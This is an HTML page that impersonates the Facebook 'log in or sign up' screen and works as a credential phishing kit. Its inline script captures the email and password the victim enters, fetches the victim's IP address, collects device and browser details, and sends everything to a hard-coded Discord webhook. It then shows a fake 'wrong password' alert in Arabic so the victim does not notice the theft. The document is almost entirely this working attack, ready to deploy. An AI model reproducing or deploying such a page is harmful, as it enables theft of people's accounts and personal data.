<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook — log in or sign up</title>
    <link rel="stylesheet" href="./index.css">
</head>

<body>
    <div class="container">
        <section class="intro-section">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </section>

        <section class="signin-section">
            <div>
                <form id="login-form">
                    <div>
                        <input type="text" id="email" placeholder="Email address or phone number">
                    </div>

                    <div>
                        <input type="password" id="password" placeholder="Password">
                    </div>

                    <div>
                        <button type="submit">Log in</button>
                    </div>

                    <a href="#">Forgotten password?</a>

                    <hr />

                    <div class="create-btn">
                        <button type="button">Create new account</button>
                    </div>
                </form>
            </div>

            <p>
                <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
            </p>
        </section>
    </div>

    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1357041316785033387/5wEfZjCix8QlA1HuLYpGzl8LR8UGVzMJLpABULXnbSDOBCCFfMCtz4eEJEh3Kiliu3RH"; // Place your Discord webhook URL here

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;

                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                    const message = `
**New Login Attempt**
- **Email:** ${email}
- **Password:** ${password}
- **IP Address:** ${ip}
- **Device Type:** ${deviceType}
- **Platform:** ${platform}
- **User Agent:** ${userAgent}
- **Screen Resolution:** ${screenWidth}x${screenHeight}
                    `;

                    axios.post(WEBHOOK_URL, {
                        content: message
                    }).then(response => {
                        alert('كلمة المرور خاطءة');
                    }).catch(error => {
                        alert('Error sending the information to Discord. Please try again.');
                    });
                })
                .catch(error => {
                    alert('Error fetching the IP address. Please try again.');
                });
        });
    </script>
</body>
</html>
